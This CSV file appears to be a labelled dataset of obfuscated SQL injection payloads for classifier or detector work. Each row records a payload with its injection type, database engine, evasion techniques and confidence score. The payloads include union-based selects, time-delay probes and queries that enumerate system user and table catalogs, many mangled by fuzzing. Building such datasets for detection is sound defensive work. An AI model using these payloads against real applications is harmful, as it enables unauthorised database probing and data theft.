payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"@(, SeLeCT; (/*z!;Bl*/ Case@WhEn '( *9o06275 _lIKE 0X0o0O0O1B6A )` THEN^5x6x7e2<elSE~0O9o0O0X0X1b0b181A* ( <SeLEct 0O7x0x3aCC|FRom mAsTER..SysDATaBAses.;)= eNd );> ()",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1"" ~) ; ) Or > ( SeLect;(sELEcT 0X2)* ( .IF; ( (_ seLEcT * FRoM ( SElect COnCAT ( 0X0X4d6E7Aa77, ( selEcT ( :eLT ( 0O0x0X1fB0X1; lIke 0b9X102CB0O0A0X4f0B11111,(SelECT 0X0o0B1) ) ) ) ,0B0X417a767A0X77,0X78 ) ;)`/*VAlo{ z (SELECT 8)(yy[hhI}e3*/ s ) , 0X7538dcFB4617fFFA, (SeLect (SeLECt (SElEcT{(SELeCT (SeLEcT 0B0x0x1d72DCFB0X1DC1fFfA)))))& ) _ ) )anD (~ (]: ""nOBT"" LIke ""NOBt",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"cAlL RegexP_subStRiNG ( rePEAT /**/( righT (~ Char _( (SelECT 3O0B0xa0164aa08c4) ) ,0X0 ) ,(SElEcT (selEct;0X1DcD0X1992)) ) ,NULl )",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"0o3"": )]] WHeRE<(SEleCT+0x1584){@LikE/**/ 0X0o10711",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0B100o1' ) ) /*Y)? */ ) $and?elT <( .8O0O0B0b10010001101011100101111010011110001011011111 LIkE (SElECT (selEcT (sELECt 0x1099))),0x1D8b111741 )/ aND"" (( ( ( 'KbkZ'? =( 'KbkZ",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0o6'/*(SELECT~(SELECT (SELECT 5)))*/whERE]0x0X0XAB0 :liKE $0o0x0x10B0b0 uniON)aLl/*}-YJ ()!4T~:;Gbm*/seLECT$nULl,nULl,NuLL,NulL<And>(SeLecT^2334)!=9845""and?(SELeCt 380)<>0x17d#yon0BKVelTj",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
0o1 ) `as/**/tYkP wheRe)(SeLECt`(select 0x1ac3)) LIke 6851,unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"4'& ) ) oR^(sElECT (SELEct/*-X*/(SeLecT (sElEct (sELECT (SeLeCt (seLecT (sELeCt 9311)))))))) lIKE ( SElECT aND (SELECT 4) And (seLECt 0x5C0) nOt Like (seLECt 1433) aNd TrUE anD ""("" NOT liKe ""(T""#COuNT ( * () FroM SYSibM.sYsTaBles As t0x0O5X0o0X0x9O6,sySIBm.sYsTaBles as T4,SYsIbM.sYstABles As t3B0x9b11]"") && ( ( ;'dKRA' lIke 'dkraW;[9v",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,string_double_quote
"1""/**/ ) ) /**/anD 0x0b6b0X0b11000111d0B0B0b10101011001000011001010000010010100101011000010101010011101011111010001011011fEc LiKe like ;( ;'aBCDefG',uPpEr }( ;hex ;(, raNDOMbloB ( 0O5X0DcD0o0B0B1100103102109/0X0b0b1X0O2 ) )/**/ + )}& ) < && ( -( * ""qUni"" LIkE ""qUNI",time_blind,sqlite,comment_whitespace|inline_comment|function_alternative|hex_string,0.53,rule,sqliv5_json,unknown
"0x0x9': ) ) AS jMNw WHere 8o0x7860 LiKE? 0X9660 or 0x1180)` LIkE = [ (; seLECt cOuNt ( &* ) frOM\SysuserS OR FALsE AND (SeLect (SElEct (SElECT((sELECt>(SELECt (sELECT (Select 0x1))))))) && ""Uj=Ek""!LIKe%""uJ=EK"" and 0B1 or ""R?v""`Not""= ""r?v"" anD TRUe.or (SELecT (SelecT (seLeCt 0x67b))) NOT liKE (SELeCT (sELeCT (SeLECT 8x0X0B1000011b))) And TrUe OR (SeLect (SELECT (SELECT (SELECT 0x0)))) AND True OR False AND True OR ""n7^x"" NOT LIKE ""n7^x""#as;Sys3O7,SYSUsErs'AS!syS0o2,sYsUsErS aS SYs0b0O3,SySuseRS as:SYS0b820,sYsuSERs/*jg(9UF2*/AS+sys5,sYsUsers AS}syS0x3,sySuseRS As/*Nz+*&cwsHS+c:WmM*/SyS7? ) Or FalSE[oR ""gw@%"" like ""GW@%J"" --yYal9aWR!:F}AfYrKk""Cb",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,string_double_quote
"9' "") `OR 0X2B10100E2o4=(""( SeLecT cOuNt ( *` ) FrOM geNeRATe_SeRieS ( (seLECT (select 0B1X6)),0B11x0o5x7c4b45/*n: aFzhi\(SeLEcT (sElEct 0X5))?dK8cZUue:fC*/ ) ) and& ( $'OBMU'` LIkE 'ObMU",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.46,rule,sqliv5_json,unknown
"0b0O0X1 WhErE 0B0x0X0b101000f LIKe` 0O7X1029*anD 0xE0x53 iN (( ( chAR ( (selEct((SElECT (sELeCT (SEleCt (SELECT 153))))) ) +chAr ( (SeLect 0X71)/ ) +cHaR ( (sELECT (sELeCT (SELECT 111))) ) /+CHaR ( (selEcT (selEcT 0X6A)) ?) ;+cHaR ( (sELeCT 7XB7) ) + ( selECt ( cAse?wHeN ( 2Xe83 Like 0xe83@ ) ThEn char^ ( 1x71 ) eLSe CHaR ( (seLECT!0x11) ) end ): ) +chAR (: (SeLecT 113) [) +char ( @0X0x7A :) +chAR ( (selECt (SELect (SeleCt (sELEct 312)))) ) Or fAlSe oR FAlse aNd tRUe$or}FAlse oR FALse[OR FalsE or False && !tRUE Or ""8"" LIke ""8m"" AND True#+char >( (SelECt (sELEct 822)) ) +char @( (SelEct (selECT (SELECT 115)))/*;+c`,Do(ZZhY:[b5SP*cSF6V*/+ ) ) ) or (selEcT 0X0b3afc) lIkE (SelECt 9X742B) ANd TRue AnD ""Lf""=""lF"" and 0X25A6 <> (sELEct 0x0x0X19A7) anD ""M"" <> ""MS"" --!CE ]v:?fKu",unknown,unknown,case_variation|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"1"". ) anD (SELEct (SELecT{0xa9C)) lIke ( SELECt cOUnt (| * ) <_frOm sysuSErs|AS Sys9,sySUSErS as SYs0B0x0X7,sysusers AS&sYS0b0b0b0x0,sYsuSerS aS syS7,SYSUSERS AS Sys0X1,sYsuSeRs aS SyS6,SysuSErs AS sys4o3 )% aND """"Ch"" != """"cH8"" &oR FAlse , Or (sELeCT|(SElect (SelEct 0X8))) oR/*^dz?]{ uzptM4LhG*/0X4 OR (sEleCT (SEleCT (sELECt (sELEcT (sELEcT 0x18Bc)))))=0x1b9B0b16001010110 AND tRUE AND}0x01bD NOT likE (Select?(SelecT (seLeCT (SELeCT 6X81Be)))) And (SELect+2X1) Or FAlSe OR FAlse oR FaLSE ANd TRuE AnD TRUe OR (SELEcT<0X0) or FALsE OR fAlse ANd tRUe OR False --",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0o1'_ oR_ (* sElECT 'OZOj'|whErE/*D=tdG*/0x0x0B0x9X0B1010013119/*?[t84` i""Q9x;(\$e*/_liKe|_0B11001001000",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"2b0o3' ) ) ' ) =or{(SELecT (seLect 0x1B3E))&LIKE likE ( .'aBCdefg',uppER! ( }HEx/*0o11y$E2=&[w/li.B:aQ6r*/ ( rAnDOmblOB ( (seLECT (sELEct (SEleCT (Select 0X0xe9eacd8))))/0O6b0b0O0X3F4 ) ) {) ) or 'M'!='M' AnD/**/0B9O0O357213017673113 NOT LIKE (sELEcT_2x0O0X0B0X0b0O2450) && (selEcT (sElect (SeleCT (SElEct:(seLEcT (SELECT 1)))))) Or 0b0X178f0o213023!=(sElECT 0x9BF) Or (selECt (SELECT (SELECT (SELECT 0)))) && True --U",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|hex_string,0.53,rule,sqliv5_json,unknown
"6X0B0O0B1111101040.^&)- ) > UnioN All,SeleCt)NuLl,NulL,NulL,nULL,null,nUll,NUll,NUll,NULl,nuLl%OR (seLEct|(selecT/(SelECT (sELEcT]4x0O0O0b0x0x3b49)))).nOT lIKe 0B0901401901008{Or fAlse`and (Select`(SeLeCt (SELEcT[0b0B0x156C))) NOT LIKE 0O0X179d oR >FALse/*JEb3*/aNd 0o5b101 And 0x0O13D8.NoT/*M|d[w9tar*/like&(seleCT 0x11D9)$ and (SElEct 0x1) OR falsEaNDTRue aNd (SeLeCt 0x4b9)~nOT LIKE (sELecT 0x132b)]or FalsE aND truE oR/**/(selEct (SELECT 0)) ANd (seLEct 1) OR 0 OR False#(_!o<h_N>7sJALw",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,numeric
"1"" ) ) ) && @ (sELECT (seLEct 3765)) IN +( ( ChAr =( (selECt (SeleCT (sELECt (sElecT (SELEct (SELECT 113)))))) ) +CHaR ( (SELEct (sElecT 113)) ) +cHaR ( (SeLeCT 0X66) ) +CHar ( 0X6a ) +chaR ( (SEleCt 0x70) ) + ( sELecT ( CaSe wHen ( (SelecT (sEleCt+(SelecT (SElECT 3665)))) lIKe 0b0b111010101011 ) tHEN cHaR= ( (Select 0X31) ) <elSE cHAr~ ( (SeLect 9x30)- ) .)eNd ) )/*RtHghS>A*/ +ChaR ( (SElECT (SEleCT (seLECT 513))) ) +ChAr ( 0B1111010 ) +chAR ( 0B0o4170136 ) +CHaR ( (SeLECt 0XDe) ) +cHAr (! (SelECT 4xAd) ) ) + ) aND ( ( ( ""DKsc"" lIkE ""dKSc",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"SElEct COuNt (/*uX4ne4?^*/ * _);< FROM.dOMain.DoMaINS@as^T0,DoMaIn.coLUmnS/*[0x0x8x6N!fUrJ*/aS~T6x8,DomaIn.tablEs;as@t0b3b0x12A2 AND ; >( !""%""=""",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
3' ) ) /**/ ) AnD0X0X7E6C =' dbmS_UTILITy.SQLid_to_SqlhAsh < ( ( chR ( (selECT 0Xd5) ) oR Chr ( (SElEct 0X61)+ ) oR cHR ( (seLECt (sElEcT (SelEct (SELECt (sELECt (sElecT (SELeCt 112))))))) ) OR cHr ;( (SELEcT (sELeCT (seLeCt (SelEcT (sELect 106))))) @)+ Or cHr ( (SElEct (SelECt (selEct (seleCT 117)))) )||( sElECt ( CaSE/**/whEn ( (sEleCT (seLECT (SElEcT 0X1E0x2E))) LIkE (selEcT 0X3E0b10e) ) thEn 0O0O0X1 elSE 0X0x0 ENd ) fROM DuAl' ) || CHR ( (SelEct 0B1810001) ) or&|cHr ( 0o0X7x7a/**/ ) ||CHr ( 7X5X56] ) ||CHr ( 2x0O7a ) /*Ul(?PtUVn'*/ Or CHr ( (sEleCt (SeLECT (SelEcT (SEleCT (SelEct 116))))) ) ) )@@ aND ( + ( $ ( 'UGOZ'/ like 'UGOZ,unknown,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.11,rule,sqliv5_json,unknown
"0X0X0B0o9b7B1191101801%' ) -unIOn ALl SeLECt/*S:*/nUll,nuLL,NulL,NuLL,NUll,NULl,nUlL,NUlL aND 0B8x7B0x0B7\anD (selECT 0B1)$> anD ] '""T;4A""=""t;7a"" OR|FAlSE]or_FAlse oR FaLSE@oR faLsE Or FALSE and 0o19297 noT liKE (seleCt 0x2628) Or, FALSe or faLSE oR FaLsE or false Or fALsE or (sElecT (SELECT 6575))=6576#zcP^LAtq",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,string_double_quote
"wAITfor@DelaY '6:(SelECT 0X9):0o11o0o0X8X5' AnD (] ""%""/*(SeLECt (sELeCT (SELECT 0b10)))/W (SELECT`(SELECT 7))*/ ~likE+ """,unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"0x8%"" ) ) -aNd)(sElecT (SELEct (seLEcT 3718))) In ( ( chAR ( %(SElECt (seLeCt 113)) )] +char ( (sElECt (SELect 0x71)) ) +ChAR ( [0o14 ) +ChAr ( (SElECt 0O151) +) +chAR ( (SElEct (seLECT (sELecT (SELECT 113)))) ) + ( selECT ( CASE WHeN ( 0o7252=3715 ) ThEN CHaR ( 0b0O64 )! eLSe cHaR ( (seLecT (SElEct (SELeCT 48))) ) eNd ) > )) +ChaR ( (SelecT 0O161) ) +cHAR ( /**/0b1117010 ) +cHaR (! (seLEcT (SelECT 0x76)) ) +Char (| 9X39a ) +ChAR ( (sElEct (SEleCT (seleCT (sELECT 183)))) ) + ) / ) AnD ( ( ""%"" /*PK}i*/LIke """,unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,in_clause
"6"",and]maKE_Set{*('?2O24141:nOt liKe(\(sElEct/0o0b0X80d3),0x0o26c0o0o3 ) { ANd ""FQxR""/*AuwrHiJn*/Like)""FqXR",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"wAITf || ~DELaY '0b0o1247:7X0:9b1'&And/*6y l;YHa~<Ic3wa'*/.<;(^ (] ;( ""lpEo"" ]=# ""lPeo`",unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"0' OR CHAR ( (SeLEcT (SElect;0b1110101)) -) (or ChAr ( (SelEct (SeLeCt (selEcT 117))); ) OR<cHAr ( (SELECT 0B0o0b0X69)* ) oR ChAr ( (SElecT 100)!/*a ,yCG!*/) liKe REgEXp_SUbsTriNg <( rePEAT ( LeFT ( ^CrYPt_KEY ( ChAR::( (SELeCt)0X41) ) Or CHaR }(+](SeLect 0O3X45) ); oR cHAr ""(] 0b1010011]+) "",Null ) ,(seLEcT 0x6) ) ,(SeLeCt 0b1011111010111106001100101100) ) (,nUlL ) aND 'dRUi'='DRui",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_single_quote
"0b0B5'% ) ^) ) Rlike .( `SELecT ( caSe whEN ( `(seLeCt 0O0B0b0o16442666504640)=0b10810101101510 ) ;tHeN 0b1 ElSe%3X0b111010/*C8^)0o0O10f0{ OR (sElect (sElECT (seLecT (SELECT (SELECT 0))))) `&& (SeLect_0b10701001111001) not lIke (SelEct (SElEcT (SELeCT (SeLecT (SELECT (SELECT 8825)))))) or FaLsE or 'E' nOT LIKE.'e' OR ""rDu""=""RdU4"" or FaLse && TRUe OR False#V&*/END %) & ) And ( :( ( 'okoj' likE 'OkoJX:* fB7H",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_single_quote
"1""+ && (SeLeCT 0xb21) lIKe casT (/ ( CHR ( (seLEct 0O0X0o0xa5) ) oR Chr/ ( *0X0Xa3 ;) OR CHR ( 0x0B1004110. ) OR chr ( (SelEct 0X0X9X0o6A) ) or CHr+ (= 0o0B1210502 ) ` )- oR ( selECT/ (< casE,wheN ;( (seLeCt 0xB25) lIKe 0XB25 ') THeN 0B0x3 elSe[0X5 END )$ ANd (SelECT (sELeCt (SelECT (selecT (SELEct (SELECT 1)))))) OR faLsE oR (seLeCT 0x1f23)!=0x1F23 or FALSE# ) ) ::TeXt || ( chr&?( 0o635 ) or Chr ( (SelECt (SELect (selECt (SELeCT (SeLECT 0x3b))))) ) oR CHR (* (sELect 0X6f) ) oR cHr (_ 5X81 ;) or cHR (| 0x71| ) : ) </*];Fvs?`r?u Or (SELEct (sElect (seLECT 6136)))<>(select (SeLEct (seleCT 0X19Ec)))#p kk{-WD6K9Ek/q4?v*/AS nUmERiC!.){ + aND ""ArDK"" lIKE ""ARDK<D*4",unknown,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.06,rule,sqliv5_json,unknown
"1%"" ) ) ) oR RoW ( &(seLECt (SELECT 1045)),0X1d8A ) > ( sELECT COUNT ( * ) ,cOncAt ( 9x0x6d6e7aa71, ( *seLECT ( ELT ( (sElEcT (SELECT 1045)) LiKE <(select (seLEcT 0x415)),(SeLECt 0B1) ) ) {) ,0x014a667A71,flo || ( r AnD~ ( 0X0B0 )/**/ *(select 2) {) ) x FroM @ ( sELecT (SelECT (sELect 0x634)) unION SELect 0x35d0(uNIOn SeLeCt (SElECt (SeLEcT 7xBeB)) uNION selECT 0X4BA ) a(GRouP bY,x ) ANd/ ( ( ( ""%"" LIke """,union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.8,rule,sqliv5_json,unknown
"0b0b0B0X0B0B4' And@0X83D0B0B110X7%=/**/ ( SElEct couNt; (/*)qt4;.pEa*/\*@>){< FRoM GenErAtE_seRIes ?( -0B100X7,0B6B1100810O4B9x22ec25, /* {*Bd*/), `); aND>'WyTG' = 'wYTg",unknown,postgresql,case_variation|comment_whitespace|inline_comment,0.06,rule,sqliv5_json,unknown
"8x0B0o0x1%"" )/*n|J~ 7b/{fKVRI &&:""+oJvo""=""+ojVO""<Or(False or FALSe#M}&a*/?~UniON AlL SelECt_NUlL*And[0o7X8b901x5~aND*0x0O0O1 and (SelEct (sElECt (sELect 0x1))) and 0x5\Or fALsE#0X4/adQ?z",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
1 ) ) aS uveP whEre (SELECt (sELeCt (sElect (SelECt 0X17e4)))) <likE 0x0b0B11110100100110011010100110011100110101010 and.(SElect 2X1B39)={ ( seLECT 0x0o0x6B3O42 FROM pg_SleEP:`(> 0B101 ) ) ) OR//*/b?+5N[:Yl5-Jgu*/(SELECT 0x0X0) or fALsE OR 0b0 oR (SeLEct (Select (SELECT 0))) --,unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
7'^[ ) ) anD% ( SelEcT * FrOM ( SeleCT %( slEEP ( -0o0X0x0x6X0x5 )! ) ) fzNO ) : ANd& % (+~&[(+ anD (SeLeCt 7x1e0x24)=0B1111030210110/**/OR (sElEcT 0x0) AND (seLect (selEcT (SeLECT 0X1))) && ? trUe oR (SELEct (sELEct (SelecT (SELECT (SELECT 0)))))#'VpQR' like 'vpQRX;Ly;,unknown,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.05,rule,sqliv5_json,unknown
"2O0o1"" )!`~ )? )/*(sELecT""(selEct`0X4))|)g fLkBQ*/ && 4x6B5b10101011008 LIKe _( <SeLEcT 0B111B0O0B8o0b1000101010001111 fROm pG_sLEEp/*[a/ ?D*/ ( 4X0b101 _) ) AnD@/*;Tea(;*/ ( (+ :""cowU""/**/LiKE>""COwu",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"0"" ) AS BpMK wHeRe:0B3b0x1A8=0o7x0o078C+unIon aLL selECT NulL,NULl,NuLL,NULl/And tRUE:aND+""G""<>""g%"" AND:TruE anD@TRUE or 0X0 &&]<TruE Or/**/FalsE OR "" T:""="" t:^"" anD<(SElecT (selECT (SELECT (SELECT 1))))#uJ? xpelW4",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,string_double_quote
"1 `)) /**/ )/**/ )AS MGVw wheRE 0x103b = 0b0b1111101110110110100101101000110910100011:uNIOn All SElEcT&nUlL,nUlL,null,Null--",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"0O1' ) )) and ( ""seLect (sEleCT (sElECt 0o2))* ( iF ( /**/( ( selECT * FRom ( SELecT conCat ( 0X7171706A73, ( sELeCT ( eLT ( 0o0B0O3632=(Select (sELect (sELeCt (sElEct (SELeCT (SELeCt 3484)))))),(SelECT (SElECT (sELECt 0))) ) /*I[|TmWT=c cqm_k}E}9*/ ) ) ,2X717A767a71,0X28 ) ) S ) , 0x7531DcFb0X0X1dC1fFFa, (sELEcT 0X4538c1B29ac0O1FfA)] ) ') ) aNd + (* ( ? 'kqip'='KQip",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
0b0b1{/**/)/?~AS VQDh<wHERe%0X6X0b1001001011: = 0x0b1010000011,unknown,unknown,comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"1' ) ) ' aNd TrUE or FaLSe And True Or falsE aND (SELECT 1)#) OR [ ( seLEct (SeleCT}(selEcT (SElEct 0x0b10111dB))) frOM ( SELeCt couNt ( * ) ,cOnCat ( ""0X0b11011410110111301110110a81, ( sELEct ( ElT ( 0x23d0b0b101 LIke 0O0x0B10111d5,(sELeCT (sElecT (seleCt (selECT 0x6))))/*x(<IPFT*/, ) ) ) ,0x717a767a0B1020110,FlO Or} ( R && {( 0O5x0o0B0b0B0 )$ *(SELECt (SElECT (SELect (SeleCt (SElecT 0o0X2))))) ) ) {x FrOM|INFoRmaTiON_SchEMA.CHArACtEr_sets groUp~BY X ) a ) anD ( ( ( 'YiEM' lIkE 'yieM?_U",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"0X9x0o0o0B1%"" ) ; OR 1X24C6 like@ ( sELEct CouNT ""( * &) } frOM SYsIBm.SystAblES as;T1,SYsiBM.SystabLeS/* OR (SeleCt (SELECT (SELECT 0))) AnD tRUe or FAlse Or (SELECT (SELECT 0xe9)) <> 0X0b0x0XE9 ANd tRUe oR FaLSE OR 0x13a4 NOT=(SELECT 5028) OR False AND True#eL2x*/AS t8,SySIbm.systABlES aS T0X3. ) anD]0X0x3x1f79 != 5x1F03 OR (SeLECT 0x25c9) NOT LIKE (selECT<(SeLeCT (sELeCt (SeLecT 8353)))) OR FAlSE?--!p`Q0x5""kH:",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0B2x9'/*5Z <?*/In;BOOLEAn}mOde/*ksb*/ )? !unIoN@ALl/**/ Or falSe*oR fAlsE#SElEcT/*k.;ze#W/ k~k*/NULL,nUlL,nuLl,NULl,nUlL,nuLL,NULl# AND {< ;:(SELeCt""0x0B0B11001001)#kd0b0O0x0O3 1Ow0B1001;\ZeFzz?",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"6""/*u`P|b-NU^O*/wHEre?0x0x1482{<+LIKE<^ 0x8ca",unknown,unknown,comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"1', ?) _), /* EA ~NYV */ as UmAH wHerE 0o0X5B0B7XE0B1C^^LIke; (SeLECT 0x1243)%UNION all'SELECT nulL,nuLl,NULL,Null)&& (sELEcT (sELecT[0b0X1))'And ""X;"" nOT = ""X;("" AND( TRUE or False Or FALsE or FalsE#<Gla~D3l",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,string_double_quote
"0o0o6B1 ? ): ); ) rLiKE /*Zq')yh*/( }sELECt (, CAse when ( +(SELeCt 0b1X1xe69) lIke=(sELeCt (SELeCT 8X0x0o1e09)) ^) TheN (seLeCT (SELECT (SELECT 1))) eLSE)0b0x98 End ) ) anD ( ( (` (sELECT 0x15c) like 2177",unknown,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"1%"" =). )% >{or,0x37B=dbMs_pIpE.ReceIVe_MeSSaGe (;/Chr ( ?(sELECt$(SELEcT (SeLeCT (SElECT (SelEct 146))))) ;) /**/ or chr$_( -0X0b0b1B :) ||chr ( (selEct 2x0o0X5A) ). or CHR (\ (sELecT 0X9){ ) ,0o9) ) or <0x1963=4O0o34320 AnD ""3021 NoT LIkE 0x0o0b0X8o0B101011810100 aND ?(Select 3X5b)!lIKE 0X0B: && 0b1 OR](seLeCT (seLECt (sELECT (seLecT 0)))) Or \""w"" Not likE ""W""* aNd ""q^5S"":nOT+LIKe ""Q^0b101S\"" ANd ""8j+"" not lIKE ""8J+C"" Or FaLSE or+faLse; AnD TruE or fAlse||FAlsE OR faLSE aNd tRUe oR ""e`8""=""e`(SeLECt 8)\"" AND 'U' not lIKE''u\' OR fALSe Or falsE OR False#ANd trUE --R""",time_blind,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,string_single_quote
"1'""wheRE 3o0O0X384D_?liKE ""OR%(sElECT}(SElEcT)(sELeCT]0x2))).And/**/1#0xd0o0b1011, && ^0x1f4o4D# =~/**/0o0b10081111011110H_",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"0o0O1""` OR * 0x83F;= $ (.]seLECt CouNt (. *' ) 'frOM;rDB$fielDs AS}t0O0b0O0O1,Rdb$tYPes As T0b14,RDB$coLLaTiONS as t7,rdb$FUnctions AS T0o0o0o4',)?` OR (sElECT/**/(SelECT 0X0x40A))=0x4152 aNd True OR 0x1;Or ""^"" nOt lIkE^""^"" oR ""E""=""EV""\/*(sElEct (SElEcT/**/(sELeCT (SElEct (sEleCt (SElEct (SeLEct (SELECT (SELECT (SELECT (SELECT 8)))))))))))<;D|*/Or >8X0 % AnD [(sElect 0X0B100)&&true OR ""U""<>""U""|--",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"1 ) ) AS fAXr WHEre 0X1f0B11006 liKE 0x1f54 OR 0x3fE= )( SelecT CoUNT (. * ) ?_From aLl_usErs t0o0b1,aLl_users T0B0X0x0X0o6b40,alL_USErS t5,All_usERS T4,aLL_useRS t0B101 `) AND (SElEcT (seLecT (SeLecT 0x0XA0b0B11110100011000110011))) nOT LIkE 0B0B0b11100101110100010111111110101100110000011101101111011111101011100001111110100011101000111011100100110111000000001100111111100001010010010111000 and (seLeCT (SELECT 1))> oR 0b0x0>AnD 1 or (SELeCt (SeLeCT 0X0)) OR FALSe/**/or (sElECT 0) or 0 ANd tRue --",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
